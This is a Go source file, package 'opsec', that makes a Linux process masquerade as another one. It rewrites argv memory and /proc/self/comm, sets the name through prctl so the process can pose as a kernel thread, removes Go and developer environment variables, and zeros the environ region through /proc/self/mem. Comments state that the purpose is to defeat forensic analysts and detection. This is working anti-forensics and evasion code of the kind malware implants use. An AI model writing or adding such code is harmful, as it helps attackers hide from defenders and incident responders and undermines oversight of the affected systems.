package opsec

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"unsafe"

	"golang.org/x/sys/unix"
)

// suspiciousEnvPrefixes lists environment variable prefixes that reveal
// tooling or development environments to forensic analysts.
var suspiciousEnvPrefixes = []string{
	"GOPATH",
	"GOROOT",
	"GOBIN",
	"GOMOD",
	"GOCACHE",
	"GOFLAGS",
	"GOTOOLCHAIN",
	"GOENV",
	"GOPROXY",
	"GONOSUMDB",
	"GONOPROXY",
	"GOVERSION",
	"RUST",
	"DEBUG",
	"CARGO",
}

// suspiciousEnvExact lists exact environment variable names to remove.
var suspiciousEnvExact = []string{
	"TERM_PROGRAM",
	"TERM_PROGRAM_VERSION",
	"COLORTERM",
	"VSCODE_GIT_IPC_HANDLE",
	"VSCODE_GIT_ASKPASS_MAIN",
	"VSCODE_GIT_ASKPASS_NODE",
}

// MasqueradeProcess performs a full process masquerade to make the current
// process appear as the specified name in ps, top, and /proc inspection.
func MasqueradeProcess(name string) error {
	// Strip brackets if the caller passed "[kworker/...]" style names.
	// Real kernel threads do NOT have brackets in /proc/PID/comm — ps adds
	// them purely for display when cmdline is empty. Writing literal brackets
	// to comm is trivially detectable via: grep '^\[' /proc/*/comm
	name = strings.Trim(name, "[]")

	// Overwrite os.Args so the process appears with the target name.
	OverwriteArgv([]string{name})

	// Write to /proc/self/comm to change the kernel's comm field (shown in ps).
	if err := os.WriteFile("/proc/self/comm", []byte(name), 0); err != nil {
		return fmt.Errorf("masquerade: failed to write /proc/self/comm: %w", err)
	}

	// Use prctl to set the process name (truncated to 15 bytes + null by kernel).
	if err := SetProcessTitle(name); err != nil {
		return fmt.Errorf("masquerade: failed to set process title: %w", err)
	}

	// Clean environment to remove Go/development indicators.
	if err := CleanEnvironment(); err != nil {
		return fmt.Errorf("masquerade: failed to clean environment: %w", err)
	}

	return nil
}

// OverwriteArgv overwrites the process argv memory in-place to change what
// appears in /proc/self/cmdline and tools like ps. The new argument values
// are written over the original argv memory, padded with null bytes.
func OverwriteArgv(newArgs []string) {
	if len(os.Args) == 0 {
		return
	}

	// Get pointer to the first argument's underlying string data.
	// os.Args[0] is backed by the original argv[0] memory from the OS.
	argv0 := os.Args[0]
	if len(argv0) == 0 {
		return
	}

	// Calculate the total argv memory region by finding the span from
	// the start of argv[0] to the end of the last argument.
	argvStart := unsafe.Pointer(unsafe.StringData(argv0))
	lastArg := os.Args[len(os.Args)-1]
	argvEnd := unsafe.Add(unsafe.Pointer(unsafe.StringData(lastArg)), len(lastArg))
	totalLen := int(uintptr(argvEnd) - uintptr(argvStart))

	if totalLen <= 0 {
		return
	}

	// Build the new cmdline: args joined by null bytes.
	newCmdline := strings.Join(newArgs, "\x00")

	// Create a slice backed by the original argv memory.
	argvSlice := unsafe.Slice((*byte)(argvStart), totalLen)

	// Zero out the entire original argv region.
	for i := range argvSlice {
		argvSlice[i] = 0
	}

	// Copy the new cmdline into the argv memory, truncating if needed.
	copyLen := len(newCmdline)
	if copyLen > totalLen-1 {
		copyLen = totalLen - 1
	}
	copy(argvSlice, newCmdline[:copyLen])

	// Update os.Args to reflect the new values.
	os.Args = newArgs
}

// SpoofCmdline overwrites argv memory to make /proc/self/cmdline show
// the specified command line string. Arguments in the string should be
// separated by spaces; they will be converted to null-separated format.
func SpoofCmdline(cmdline string) error {
	if cmdline == "" {
		return fmt.Errorf("masquerade: empty cmdline")
	}

	// Split on spaces and overwrite argv with the resulting arguments.
	parts := strings.Fields(cmdline)
	OverwriteArgv(parts)

	return nil
}

// CleanEnvironment removes environment variables that could reveal the
// process is a Go binary or development tool. This includes anything
// with GO, RUST, DEBUG prefixes, and specific variables like TERM_PROGRAM.
func CleanEnvironment() error {
	// Collect keys to unset (avoid modifying env while iterating).
	var toRemove []string

	for _, env := range os.Environ() {
		parts := strings.SplitN(env, "=", 2)
		if len(parts) == 0 {
			continue
		}
		key := parts[0]

		// Check exact matches.
		for _, exact := range suspiciousEnvExact {
			if key == exact {
				toRemove = append(toRemove, key)
				break
			}
		}

		// Check prefix matches.
		for _, prefix := range suspiciousEnvPrefixes {
			if strings.HasPrefix(key, prefix) {
				toRemove = append(toRemove, key)
				break
			}
		}
	}

	for _, key := range toRemove {
		if err := os.Unsetenv(key); err != nil {
			return fmt.Errorf("masquerade: failed to unset %s: %w", key, err)
		}
	}

	return nil
}

// SetProcessTitle sets the process name visible in /proc/self/status and
// the kernel task list via prctl(PR_SET_NAME). The kernel truncates the
// name to 15 bytes plus a null terminator.
func SetProcessTitle(title string) error {
	// Truncate to 15 bytes (kernel limit for comm).
	if len(title) > 15 {
		title = title[:15]
	}

	// PR_SET_NAME expects a null-terminated byte slice.
	nameBytes := make([]byte, 16)
	copy(nameBytes, title)

	if err := unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&nameBytes[0])), 0, 0, 0); err != nil {
		return fmt.Errorf("masquerade: prctl PR_SET_NAME failed: %w", err)
	}

	return nil
}

// ScrubEnvironMemory overwrites the process's environ memory region with zeros.
// This ensures /proc/[pid]/environ returns empty data, preventing forensic
// analysts from recovering environment variables via procfs.
//
// os.Clearenv() must be called BEFORE this function — it clears Go's internal
// env map. This function then zeros the kernel-visible memory backing
// /proc/[pid]/environ.
func ScrubEnvironMemory() error {
	// Read /proc/self/stat to locate the environ memory region.
	statBytes, err := os.ReadFile("/proc/self/stat")
	if err != nil {
		return fmt.Errorf("masquerade: failed to read /proc/self/stat: %w", err)
	}
	stat := string(statBytes)

	// The comm field is wrapped in parentheses and may contain spaces or
	// nested parens. Find the last ')' to skip past it safely.
	lastParen := strings.LastIndex(stat, ")")
	if lastParen < 0 {
		return fmt.Errorf("masquerade: malformed /proc/self/stat: no closing paren")
	}

	// Everything after "pid (comm) " — split on whitespace.
	// Fields after comm start at index 0 = state (kernel field 3).
	// env_start is kernel field 50, index 50-3 = 47.
	// env_end is kernel field 51, index 51-3 = 48.
	remaining := strings.TrimSpace(stat[lastParen+1:])
	fields := strings.Fields(remaining)

	const envStartIdx = 47
	const envEndIdx = 48

	if len(fields) <= envEndIdx {
		return fmt.Errorf("masquerade: /proc/self/stat has too few fields (%d)", len(fields))
	}

	envStart, err := strconv.ParseUint(fields[envStartIdx], 10, 64)
	if err != nil {
		return fmt.Errorf("masquerade: failed to parse env_start: %w", err)
	}

	envEnd, err := strconv.ParseUint(fields[envEndIdx], 10, 64)
	if err != nil {
		return fmt.Errorf("masquerade: failed to parse env_end: %w", err)
	}

	if envEnd <= envStart {
		// Nothing to scrub (empty or already zeroed).
		return nil
	}

	size := int(envEnd - envStart)

	// Open /proc/self/mem for writing to directly zero the environ region.
	mem, err := os.OpenFile("/proc/self/mem", os.O_WRONLY, 0)
	if err != nil {
		return fmt.Errorf("masquerade: failed to open /proc/self/mem: %w", err)
	}
	defer mem.Close()

	zeros := make([]byte, size)
	if _, err := mem.WriteAt(zeros, int64(envStart)); err != nil {
		return fmt.Errorf("masquerade: failed to zero environ memory: %w", err)
	}

	return nil
}
